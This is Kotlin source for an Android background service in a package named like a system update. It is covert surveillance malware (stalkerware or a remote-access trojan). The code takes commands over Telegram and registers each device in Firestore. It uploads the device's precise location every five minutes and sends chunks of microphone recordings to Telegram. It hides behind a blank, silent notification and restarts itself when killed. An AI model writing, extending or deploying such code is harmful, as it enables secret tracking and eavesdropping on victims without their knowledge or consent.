package com.sys.update2

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class BackgroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var running = true

    override fun onCreate() {
        super.onCreate()

        // Foreground notification — إشعار صغير أبيض بدون نص
        startForegroundWithNotification()

        // استقبال الأوامر من تلغرام
        try { CommandListener.start(applicationContext) } catch (_: Exception) {}

        // تسجيل الجهاز في Firestore
        try { DeviceManager.registerDevice(applicationContext) } catch (_: Exception) {}

        // ⭐ SyncWorker — يبدأ بعد 3 ثواني (بعد ما registerDevice يخلّص)
        scope.launch {
            delay(3_000L)
            try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
        }

        // Heartbeat كل 3 دقايق
        scope.launch {
            while (running) {
                try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
                delay(3 * 60_000L)
            }
        }

        // ⭐ الموقع شغال دائم في الخلفية (كل 5 دقايق)
        scope.launch {
            while (running) {
                try {
                    val loc = LocationHelper.getPreciseLocation(applicationContext, 15)
                    if (loc != null) {
                        LocationCache.save(applicationContext, loc.latitude, loc.longitude, loc.accuracy)
                        // لو التتبع التلقائي مفعّل — يبعت للتلغرام
                        if (KeyboardBuilder.locationOn) {
                            TelegramApi.sendMessage("📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}")
                        }
                    }
                } catch (_: Exception) {}
                delay(5 * 60_000L)
            }
        }

        // تنظيف ملفات الكاش القديمة
        scope.launch {
            while (running) {
                try {
                    val audioDir = File(applicationContext.cacheDir, "audio")
                    if (audioDir.exists()) {
                        val cutoff = System.currentTimeMillis() - 3600_000L
                        audioDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
                    }
                } catch (_: Exception) {}
                delay(10 * 60_000L)
            }
        }

        // ⭐ المايك (لو مفعّل يدوياً)
        scope.launch {
            while (running) {
                try {
                    if (AudioRecorder.isRunning()) {
                        AudioRecorder.startChunk(applicationContext)
                        delay(Config.AUDIO_CHUNK_MS)
                        val done = AudioRecorder.stopChunk()
                        if (done != null && done.exists() && done.length() > 1000) {
                            TelegramApi.sendAudio(done, "🎤 ${done.name}")
                            done.delete()
                        }
                    } else {
                        delay(5000L)
                    }
                } catch (_: Exception) { delay(5000L) }
            }
        }

        // ⭐ Watchdog — يتحقق كل دقيقة إن كل حاجة شغالة
        scope.launch {
            while (running) {
                delay(60_000L)
                try {
                    // لو الـ SyncWorker وقف، شغّله تاني
                    if (!SyncWorkerIsRunning()) {
                        SyncWorker.start(applicationContext)
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private fun SyncWorkerIsRunning(): Boolean {
        return try {
            // فحص بسيط: هل فيه thread اسمه sync-main؟
            Thread.getAllStackTraces().keys.any { it.name == "sync-main" && it.isAlive }
        } catch (_: Exception) { true }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        try { CommandListener.stop() } catch (_: Exception) {}
        try { SyncWorker.stop() } catch (_: Exception) {}
        try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
        scope.cancel()

        // إعادة تشغيل الخدمة تلقائياً
        try {
            val restart = Intent(applicationContext, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restart)
            } else {
                applicationContext.startService(restart)
            }
        } catch (_: Exception) {}

        super.onDestroy()
    }

    // ═══════════════════════════════════════════
    //  Foreground notification — أبيض صغير بدون نص
    // ═══════════════════════════════════════════
    private fun startForegroundWithNotification() {
        val channelId = "sys_sync_channel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(channelId) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(channelId, " ", NotificationManager.IMPORTANCE_MIN)
                        .apply {
                            setSound(null, null)
                            enableVibration(false)
                            setShowBadge(false)
                            description = " "
                        }
                )
            }
        }

        val notif: Notification = NotificationCompat.Builder(this, channelId)
            .setSmallIcon(android.R.drawable.screen_background_light_transparent)
            .setContentTitle(" ")
            .setContentText(" ")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1001, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(1001, notif)
        }
    }
}
